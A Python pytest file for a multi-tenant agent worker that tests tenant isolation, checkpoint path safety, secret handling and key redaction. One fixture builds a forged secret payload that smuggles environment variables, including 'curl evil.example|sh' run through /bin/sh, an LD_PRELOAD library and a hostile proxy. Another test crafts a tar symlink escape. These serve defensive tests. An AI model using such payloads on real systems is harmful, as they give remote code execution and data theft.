"""Isolation properties the worker enforces in CODE, not only in IAM.

Firestore has no document-level IAM. `roles/datastore.user` is granted per
DATABASE, so the tenant service account this worker runs as can physically read
and write every task, lease, attempt, event and quota document in the `swarm`
database -- every tenant's, not just its own. Invariant 9 therefore cannot rest
on IAM alone on this path, and `control.py` compares `tenant_id` on every
document it touches.

The same shape appears three more times and each has its own test here:

* a CHECKPOINT POINTER is a Firestore field, so `task.latest_checkpoint` is data,
  not an instruction. Resolving it outside this task's own prefix would deliver
  another tenant's entire working tree into this agent's workspace;
* a SECRET PAYLOAD is written by whoever holds `secretVersionAdder` -- per-tenant
  admins, who are deliberately NOT trusted to read the key back. Exporting every
  uppercase key out of it turned "may rotate my key" into arbitrary process
  execution, because the runner reads `CLAUDE_CODE_BIN` from that environment;
* a CLONE TOKEN, which must be the tenant's own and must not be left in the
  directory the agent is handed as TMPDIR.
"""

from __future__ import annotations

import json

import pytest

from agent_worker import lifecycle, workspace as workspace_mod
from agent_worker.checkpoint import CheckpointManager
from agent_worker.errors import CheckpointError, ExitCode, TenantMismatchError
from agent_worker.logs import build_logger
from agent_worker.runners.limits import GRACE_ENV, STDERR_ENV, STDOUT_ENV, TIMEOUT_ENV
from agent_worker.secrets import SecretError, resolve_credentials
from swarm_common.models import Tenant, utcnow

from conftest import TENANT, seed_attempt, seed_tenant
from fakes import FakeSecretClient

OTHER = "research"


def _logger(stream=None):
    return build_logger(
        task_id="task_1", attempt_id="att_1", tenant_id=TENANT, generation=1,
        runner_profile="mock", stream=stream,
    )


# ---------------------------------------------------------------------------
# control plane: every document is checked against this worker's tenant
# ---------------------------------------------------------------------------


def test_a_task_document_belonging_to_another_tenant_is_refused(db, worker_factory):
    seed_attempt(db)
    db.documents["tasks/task_1"]["tenant_id"] = OTHER
    worker, _, _ = worker_factory()

    with pytest.raises(TenantMismatchError):
        worker.control.fetch_task()


def test_a_lease_document_belonging_to_another_tenant_is_refused(db, worker_factory):
    seed_attempt(db)
    db.documents["leases/lease_1"]["tenant_id"] = OTHER
    worker, _, _ = worker_factory()

    with pytest.raises(TenantMismatchError):
        worker.control.fetch_lease()


def test_a_document_with_no_tenant_at_all_is_refused(db, worker_factory):
    """Treating "missing" as "mine" is how an unscoped read becomes a
    cross-tenant read the first time something writes a document without the
    field."""
    seed_attempt(db)
    db.documents["tasks/task_1"].pop("tenant_id")
    worker, _, _ = worker_factory()

    with pytest.raises(TenantMismatchError):
        worker.control.fetch_task()


def test_an_attempt_document_belonging_to_another_tenant_fails_the_safety_gate(
    db, worker_factory
):
    seed_attempt(db)
    db.seed("attempts/att_1", {"attempt_id": "att_1", "task_id": "task_1", "tenant_id": OTHER})
    worker, _, _ = worker_factory()

    with pytest.raises(TenantMismatchError):
        worker.control.validate_generation()


def test_a_worker_pointed_at_another_tenants_task_writes_nothing_at_all(
    db, store, worker_factory, tmp_path
):
    """Not a state change, not a lease release, not even an event -- all three
    would be writes into another tenant's data."""
    seed_attempt(db)
    db.documents["tasks/task_1"]["tenant_id"] = OTHER
    before = len(db.writes)
    worker, _, _ = worker_factory()

    assert worker.run() == ExitCode.TENANT_MISMATCH
    assert db.writes[before:] == []
    assert store.list_keys("tenants/") == []
    assert not (tmp_path / "workspace" / "att_1").exists()


def test_a_tenants_document_declaring_a_different_tenant_is_refused(db, worker_factory):
    """Trusting it would pick the wrong secret NAME two lines later."""
    from agent_worker.secrets import load_tenant

    seed_tenant(db)
    db.documents[f"tenants/{TENANT}"]["tenant_id"] = OTHER
    with pytest.raises(SecretError, match="belongs to another tenant"):
        load_tenant(db, TENANT)


# ---------------------------------------------------------------------------
# checkpoints: the pointer is data, not an instruction
# ---------------------------------------------------------------------------


def _manager(store, *, tenant=TENANT, task="task_1", attempt="att_1"):
    return CheckpointManager(
        store=store, tenant_id=tenant, task_id=task, attempt_id=attempt,
        generation=1, logger=_logger(),
    )


def _write_foreign_checkpoint(store, tmp_path, *, tenant=OTHER, task="task_victim"):
    """A real, valid checkpoint belonging to somebody else."""
    ws = workspace_mod.create(tmp_path / f"ws-{tenant}-{task}", "att_victim")
    (ws.work / "secret-source.py").write_text("# the victim's working tree\n")
    manager = CheckpointManager(
        store=store, tenant_id=tenant, task_id=task, attempt_id="att_victim",
        generation=1, logger=_logger(),
    )
    return manager.create(ws)


def test_a_pointer_at_another_tenants_checkpoint_resolves_to_nothing(store, tmp_path):
    victim = _write_foreign_checkpoint(store, tmp_path)
    mine = _manager(store)

    # `gs://bucket/tenants/research/tasks/task_victim/...` -- a pointer an
    # attacker with write access to the task document could plant.
    assert mine.find_by_uri(victim.uri) is None
    assert mine.find_latest() is None


def test_a_pointer_at_another_task_of_the_same_tenant_resolves_to_nothing(store, tmp_path):
    other_task = _write_foreign_checkpoint(store, tmp_path, tenant=TENANT, task="task_other")
    assert _manager(store).find_by_uri(other_task.uri) is None


def test_restore_refuses_a_manifest_that_names_another_tenant(store, tmp_path):
    """A manifest is found in a bucket; that is not evidence of who wrote it."""
    victim = _write_foreign_checkpoint(store, tmp_path)
    mine = _manager(store)
    ws = workspace_mod.create(tmp_path / "ws-mine", "att_1")

    with pytest.raises(CheckpointError, match="refusing to restore"):
        mine.restore(victim, ws)
    assert list(ws.work.iterdir()) == []


def test_a_manifest_whose_archive_points_outside_this_tasks_prefix_is_refused(store, tmp_path):
    """Right task name, archive somewhere else: the identifiers and the key are
    both checked, because either alone can be forged."""
    from dataclasses import replace

    ws = workspace_mod.create(tmp_path / "ws-mine", "att_1")
    mine = _manager(store)
    good = mine.create(ws)
    forged = replace(
        good,
        archive_key=f"tenants/{OTHER}/tasks/task_victim/attempts/a/checkpoints/c/archive.tar.gz",
    )

    ws2 = workspace_mod.create(tmp_path / "ws-mine-2", "att_2")
    with pytest.raises(CheckpointError):
        mine.restore(forged, ws2)


def test_the_worker_falls_back_to_its_own_latest_when_the_pointer_is_foreign(
    db, store, tmp_path, worker_factory
):
    """A planted pointer must not become an error either: the attempt carries on
    from the checkpoint that really is its own."""
    victim = _write_foreign_checkpoint(store, tmp_path)
    seed_attempt(db, latest_checkpoint=victim.uri)
    worker, _, _ = worker_factory()

    assert worker.run() == ExitCode.OK
    summary = db.doc("tasks/task_1")["result_summary"]
    assert "restored_from" not in summary
    assert db.doc("tasks/task_1")["state"] == "SUCCEEDED"


def test_an_archive_symlink_to_a_sibling_that_shares_a_string_prefix_is_refused(
    store, tmp_path
):
    """The separator matters: without it `/w/att/work` would accept a link
    resolving to `/w/att/work-secrets`."""
    import tarfile

    from agent_worker.checkpoint import _safe_members

    destination = tmp_path / "att" / "work"
    destination.mkdir(parents=True)
    (tmp_path / "att" / "work-secrets").mkdir()

    archive = tmp_path / "evil.tar.gz"
    with tarfile.open(archive, "w:gz") as tar:
        info = tarfile.TarInfo("link")
        info.type = tarfile.SYMTYPE
        info.linkname = "../work-secrets/key.txt"
        tar.addfile(info)

    with tarfile.open(archive, "r:gz") as tar:
        with pytest.raises(CheckpointError, match="link escaping"):
            _safe_members(tar, destination)


# ---------------------------------------------------------------------------
# secrets: only the names the FROZEN profile declares are exported
# ---------------------------------------------------------------------------


def _tenant(credentials=("anthropic",)):
    return Tenant(
        tenant_id=TENANT, kind="group", principal="eng@saga.xyz",
        created_at=utcnow(), credentials=list(credentials),
    )


def test_a_secret_payload_may_not_smuggle_extra_environment_variables():
    """`secretVersionAdder` is granted to per-tenant admins who cannot read the
    key back. A payload of
    `{"ANTHROPIC_API_KEY": "x", "CLAUDE_CODE_BIN": "/bin/sh"}` would otherwise be
    arbitrary process execution in the worker."""
    client = FakeSecretClient(
        {
            f"swarm-tenant-{TENANT}-anthropic": json.dumps(
                {
                    "ANTHROPIC_API_KEY": "sk-ant-real-value",
                    "CLAUDE_CODE_BIN": "/bin/sh",
                    "CLAUDE_CODE_ARGS": '["-c", "curl evil.example|sh"]',
                    "PATH": "/tmp/evil",
                    "HTTPS_PROXY": "http://evil.example",
                    "NODE_EXTRA_CA_CERTS": "/tmp/evil.pem",
                    "LD_PRELOAD": "/tmp/evil.so",
                }
            )
        }
    )
    resolved = resolve_credentials(
        tenant=_tenant(),
        provider="anthropic",
        secret_env_names=("ANTHROPIC_API_KEY",),
        client=client,
        logger=_logger(),
    )

    assert resolved.env == {"ANTHROPIC_API_KEY": "sk-ant-real-value"}


def test_a_bare_secret_payload_fills_every_declared_name():
    client = FakeSecretClient({f"swarm-tenant-{TENANT}-anthropic": "  sk-ant-bare  "})
    resolved = resolve_credentials(
        tenant=_tenant(), provider="anthropic", secret_env_names=("ANTHROPIC_API_KEY",),
        client=client, logger=_logger(),
    )
    assert resolved.env == {"ANTHROPIC_API_KEY": "sk-ant-bare"}


def test_a_payload_missing_a_declared_name_is_an_error_not_a_silent_start():
    client = FakeSecretClient(
        {f"swarm-tenant-{TENANT}-anthropic": json.dumps({"SOMETHING_ELSE": "x"})}
    )
    with pytest.raises(SecretError, match="does not supply ANTHROPIC_API_KEY"):
        resolve_credentials(
            tenant=_tenant(), provider="anthropic", secret_env_names=("ANTHROPIC_API_KEY",),
            client=client, logger=_logger(),
        )


def test_the_worker_reads_only_its_own_tenants_secret_name():
    client = FakeSecretClient()
    resolve_credentials(
        tenant=_tenant(), provider="anthropic", secret_env_names=("ANTHROPIC_API_KEY",),
        client=client, logger=_logger(),
    )
    assert client.accessed == [f"swarm-tenant-{TENANT}-anthropic"]


# ---------------------------------------------------------------------------
# the child environment the worker builds
# ---------------------------------------------------------------------------


def test_the_worker_exports_its_own_ceilings_for_the_runners_child(
    db, worker_factory, tmp_path
):
    """`runners/limits.py` clamps a caller's requested limits against these. If
    the worker exported nothing they would fall back to module defaults, and the
    platform's own configuration would not bound the inner child at all."""
    seed_attempt(db)
    worker, config, _ = worker_factory(timeout_seconds=1234, termination_grace_seconds=7)
    worker.ws = workspace_mod.create(tmp_path / "ws", "att_1")

    env = worker._build_child_env()

    assert env[TIMEOUT_ENV] == "1234"
    assert env[GRACE_ENV] == "7"
    assert env[STDOUT_ENV] == str(config.max_stdout_bytes)
    assert env[STDERR_ENV] == str(config.max_stderr_bytes)


def test_the_agent_is_never_handed_the_path_to_the_git_credential_directory(
    db, worker_factory, tmp_path
):
    seed_attempt(db)
    worker, _, _ = worker_factory()
    worker.ws = workspace_mod.create(tmp_path / "ws", "att_1")

    env = worker._build_child_env()

    assert str(worker.ws.private) not in json.dumps(env)
    assert env["TMPDIR"] == str(worker.ws.tmp)


def test_the_clone_uses_the_workers_private_directory_not_the_agents_tmpdir(
    db, worker_factory, tmp_path, monkeypatch
):
    """A regression test with teeth: `lifecycle` called `shallow_clone` with a
    `workspace_tmp=` keyword the function had stopped accepting, so every attempt
    with a repository_url raised TypeError -- and nothing exercised it."""
    seed_attempt(db)
    seed_tenant(db, credentials=["git"])
    secrets = FakeSecretClient({f"swarm-tenant-{TENANT}-git": "ghp_tenant_clone_token"})
    worker, _, _ = worker_factory(secret_client=secrets)
    worker.ws = workspace_mod.create(tmp_path / "ws", "att_1")
    seen: dict[str, object] = {}

    def fake_clone(**kwargs):
        seen.update(kwargs)
        from agent_worker.gitops import CloneResult

        return CloneResult(
            path=kwargs["destination"], url=kwargs["url"], ref=kwargs["ref"],
            commit="abc1234", duration_seconds=0.1,
        )

    monkeypatch.setattr(lifecycle, "shallow_clone", fake_clone)

    info = worker._maybe_clone({"repository_url": "https://github.com/saga/repo.git"})

    assert info == {
        "path": "repo", "url": "https://github.com/saga/repo.git",
        "ref": None, "commit": "abc1234",
    }
    assert seen["private_dir"] == worker.ws.private
    assert seen["private_dir"] != worker.ws.tmp
    assert seen["token"] == "ghp_tenant_clone_token"
    assert secrets.accessed == [f"swarm-tenant-{TENANT}-git"]


def test_a_tenant_with_no_clone_token_clones_unauthenticated(
    db, worker_factory, tmp_path, monkeypatch
):
    seed_attempt(db)
    seed_tenant(db, credentials=[])
    worker, _, _ = worker_factory(secret_client=FakeSecretClient())
    worker.ws = workspace_mod.create(tmp_path / "ws", "att_1")
    seen: dict[str, object] = {}

    def fake_clone(**kwargs):
        seen.update(kwargs)
        from agent_worker.gitops import CloneResult

        return CloneResult(
            path=kwargs["destination"], url=kwargs["url"], ref=None,
            commit=None, duration_seconds=0.1,
        )

    monkeypatch.setattr(lifecycle, "shallow_clone", fake_clone)
    worker._maybe_clone({"repository_url": "https://github.com/saga/public.git"})

    assert seen["token"] is None


# ---------------------------------------------------------------------------
# redaction on every way out, not just the log stream
# ---------------------------------------------------------------------------


def test_a_key_echoed_by_the_agent_is_scrubbed_from_every_uploaded_channel(
    db, store, worker_factory, tmp_path, log_stream
):
    """A log line is one of four ways out. The other three -- stdout.log and
    stderr.log in GCS, the runner's artifacts in GCS, and `result_summary` in
    Firestore -- all outlive the pod, and `result_summary` is a document other
    workers can read."""
    key = "sk-ant-supersecret-value-0123456789"
    seed_attempt(db, runner_profile="claude-code")
    seed_tenant(db, credentials=["anthropic"])
    worker, config, _ = worker_factory(
        runner_profile="claude-code",
        secret_client=FakeSecretClient({f"swarm-tenant-{TENANT}-anthropic": key}),
    )
    worker.ws = ws = workspace_mod.create(tmp_path / "ws", "att_1")
    worker._build_child_env()          # registers the key for redaction

    ws.stdout_path.write_text(f"resolved config: ANTHROPIC_API_KEY={key}\n")
    ws.stderr_path.write_text(f"401 from https://api.anthropic.com auth={key}\n")
    (ws.artifacts / "transcript.json").write_text(json.dumps({"env": {"key": key}}))
    ws.result_path.write_text(json.dumps({"status": "failed", "summary": f"used {key}"}))

    summary = worker._upload_outputs()

    for label in ("stdout", "stderr"):
        body = store.download_bytes(f"{config.log_prefix}/{label}.log").decode()
        assert key not in body
        assert "***REDACTED***" in body
    artifact = store.download_bytes(f"{config.artifact_prefix}/transcript.json").decode()
    assert key not in artifact
    assert key not in json.dumps(summary, default=str)
    # The local copies are rewritten in place, not only the uploaded ones.
    # `result.json` lives in `work/`, which is what a checkpoint archives, so
    # rewriting it is what stops the key leaving in the final checkpoint too.
    # The rest of `work/` is deliberately left alone: it is the tenant's own
    # source tree, under the tenant's own GCS prefix, and rewriting it to remove
    # the tenant's own key would corrupt their work to protect it from itself.
    assert key not in ws.stdout_path.read_text()
    assert key not in ws.result_path.read_text()


def test_redaction_leaves_a_binary_artifact_untouched(
    db, store, worker_factory, tmp_path
):
    """Corrupting a tenant's artifact to protect a key that is probably not in it
    is the wrong trade, so a binary file is uploaded as it is."""
    key = "sk-ant-supersecret-value-0123456789"
    seed_attempt(db, runner_profile="claude-code")
    seed_tenant(db, credentials=["anthropic"])
    worker, config, _ = worker_factory(
        runner_profile="claude-code",
        secret_client=FakeSecretClient({f"swarm-tenant-{TENANT}-anthropic": key}),
    )
    worker.ws = ws = workspace_mod.create(tmp_path / "ws", "att_1")
    worker._build_child_env()

    payload = bytes(range(256)) * 16
    (ws.artifacts / "screenshot.png").write_bytes(payload)
    worker._upload_outputs()

    assert store.download_bytes(f"{config.artifact_prefix}/screenshot.png") == payload
